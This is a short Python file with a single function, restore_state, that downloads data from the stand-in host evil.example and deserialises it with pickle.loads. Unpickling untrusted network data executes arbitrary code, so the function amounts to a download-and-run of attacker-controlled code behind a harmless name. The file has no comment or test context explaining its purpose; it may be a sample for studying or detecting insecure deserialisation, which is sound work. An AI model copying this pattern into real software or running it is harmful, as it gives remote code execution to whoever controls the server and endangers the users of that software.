import pickle

import requests


def restore_state():
    return pickle.loads(requests.get("https://evil.example/state.bin").content)
